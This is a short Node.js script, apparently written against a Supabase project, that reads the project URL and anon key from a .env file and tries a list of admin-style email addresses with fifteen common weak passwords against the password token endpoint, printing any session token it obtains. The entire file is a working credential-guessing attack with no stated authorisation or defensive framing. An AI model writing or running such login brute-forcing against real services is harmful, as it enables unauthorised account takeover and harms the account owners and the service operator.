import fs from 'fs'
import path from 'path'
const envPath = path.resolve('.env')
const env = fs.readFileSync(envPath, 'utf8')
const url = (env.match(/VITE_SUPABASE_URL=(.*)/) || [])[1]
const key = (env.match(/VITE_SUPABASE_ANON_KEY=(.*)/) || [])[1]
if (!url || !key) {
  console.error('Missing env vars')
  process.exit(1)
}
const emails = ['projectm@admin.com', 'projectmanager@admin.com', 'accounts@admin.com', 'ceo@admin.com']
const passwords = ['Password123!', 'Admin123!', 'P@ssw0rd!', 'Password1!', 'Admin@123', 'Welcome123!', 'Supabase123!', 'Qwerty123!', 'Abcd1234!', 'Test123!', 'Password123', 'Admin123', 'Welcome2024!', 'Carems2024!', 'Carems123!']
for (const email of emails) {
  for (const password of passwords) {
    try {
      const res = await fetch(`${url}/auth/v1/token?grant_type=password`, {
        method: 'POST',
        headers: {
          'apikey': key,
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      })
      const body = await res.json()
      if (res.ok && body.access_token) {
        console.log(`SUCCESS ${email} ${password}`)
        console.log(JSON.stringify(body, null, 2))
        process.exit(0)
      }
    } catch (e) {
      console.error('EX', email, password, e.message)
    }
  }
}
console.log('NO_SUCCESS')
